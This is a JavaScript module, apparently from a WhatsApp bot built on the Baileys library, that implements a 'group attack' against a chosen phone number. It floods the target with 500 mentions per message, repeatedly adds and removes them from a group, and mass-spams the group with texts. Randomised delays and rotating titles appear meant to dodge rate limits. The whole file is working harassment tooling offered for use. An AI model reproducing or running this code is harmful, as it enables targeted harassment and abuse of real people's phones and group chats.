// lib/xgc.js
// XGC — real group attack
// Mention flood + Add/Remove spam + Mass text spam

const crypto = require('crypto');
const { delay } = require('@whiskeysockets/baileys');

const CONFIG = {
    MENTION_COUNT: 500,           // mentions per message
    MENTION_LOOP: 3,              // messages
    MENTION_DELAY_MS: 8000,

    ADDREMOVE_ROUNDS: 8,
    ADDREMOVE_DELAY_MS: 2500,

    TEXT_COUNT: 30,
    TEXT_DELAY_MS: 1200,

    SILENT: true,
    EPHEMERAL: true,
    EPHEMERAL_SECONDS: 30
};

function jitter(base) {
    return base + (Math.random() * 2 - 1) * base * 0.5;
}

function pickTitle() {
    const t = ['Hey', 'Yo', 'Info', 'Notice', 'Update', 'Check', 'Alert', 'Ping'];
    return t[Math.floor(Math.random() * t.length)];
}

function safeContext(extra = {}) {
    return {
        silent: CONFIG.SILENT,
        expiration: CONFIG.EPHEMERAL ? CONFIG.EPHEMERAL_SECONDS : 0,
        ephemeralSettingTimestamp: CONFIG.EPHEMERAL ? Date.now() : 0,
        ...extra
    };
}

// ═══════════════════════════════════════════
//  VECTOR 1 — MENTION FLOOD
//  Target ke phone pe 500 notifications per message
// ═══════════════════════════════════════════
async function vecMentionFlood(sock, groupJid, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.MENTION_LOOP; i++) {
        try {
            const mentions = Array(CONFIG.MENTION_COUNT).fill(targetJid);
            const mentionText = mentions.map(() =>
                `@${targetJid.split('@')[0]}`
            ).join(' ');

            await sock.sendMessage(groupJid, {
                text: pickTitle() + '\n\n' + mentionText,
                mentions,
                contextInfo: safeContext({ mentionedJid: mentions })
            });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'mention');
        } catch (err) {
            state.errors++;
            console.error('[xgc] mention err:', err.message);
        }
        await delay(jitter(CONFIG.MENTION_DELAY_MS));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — ADD/REMOVE SPAM
//  Target ko baar baar add/remove karo
// ═══════════════════════════════════════════
async function vecAddRemove(sock, groupJid, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.ADDREMOVE_ROUNDS; i++) {
        try {
            await sock.groupParticipantsUpdate(groupJid, [targetJid], 'add');
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'add');
            await delay(CONFIG.ADDREMOVE_DELAY_MS);

            await sock.groupParticipantsUpdate(groupJid, [targetJid], 'remove');
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'remove');
            await delay(CONFIG.ADDREMOVE_DELAY_MS);
        } catch (err) {
            state.errors++;
            console.error('[xgc] addremove err:', err.message);
            break; // usually means bot not admin
        }
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 3 — MASS TEXT SPAM IN GROUP
// ═══════════════════════════════════════════
async function vecGroupTextSpam(sock, groupJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.TEXT_COUNT; i++) {
        try {
            await sock.sendMessage(groupJid, {
                text: pickTitle() + ' ' + crypto.randomBytes(2).toString('hex'),
                contextInfo: safeContext()
            });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'text');
        } catch (err) {
            state.errors++;
        }
        await delay(jitter(CONFIG.TEXT_DELAY_MS));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  MAIN — XGC
// ═══════════════════════════════════════════
async function XGC(sock, groupJid, targetNum, mode, onProgress) {
    const targetJid = targetNum + '@s.whatsapp.net';
    const state = { success: 0, errors: 0, errorRate: 0, total: 0 };
    const vectors = [];

    const updateErr = () => {
        const t = state.success + state.errors;
        state.errorRate = t > 0 ? state.errors / t : 0;
    };

    const run = async (name, fn) => {
        try {
            const s = await fn();
            updateErr();
            if (s > 0) vectors.push(name);
        } catch (err) {
            console.error(`[xgc] ${name} fatal:`, err.message);
            state.errors++; updateErr();
        }
    };

    if (mode === 'mention' || mode === 'all') {
        state.total += CONFIG.MENTION_LOOP;
        await run('mention', () => vecMentionFlood(sock, groupJid, targetJid, onProgress, state));
        if (mode === 'all') await delay(jitter(15000));
    }
    if (mode === 'addremove' || mode === 'all') {
        state.total += CONFIG.ADDREMOVE_ROUNDS * 2;
        await run('addremove', () => vecAddRemove(sock, groupJid, targetJid, onProgress, state));
        if (mode === 'all') await delay(jitter(15000));
    }
    if (mode === 'text' || mode === 'all') {
        state.total += CONFIG.TEXT_COUNT;
        await run('text', () => vecGroupTextSpam(sock, groupJid, onProgress, state));
    }

    return {
        ok: state.success > 0,
        sent: state.success,
        errors: state.errors,
        errorRate: state.errorRate.toFixed(2),
        vectors
    };
}

module.exports = { XGC, CONFIG };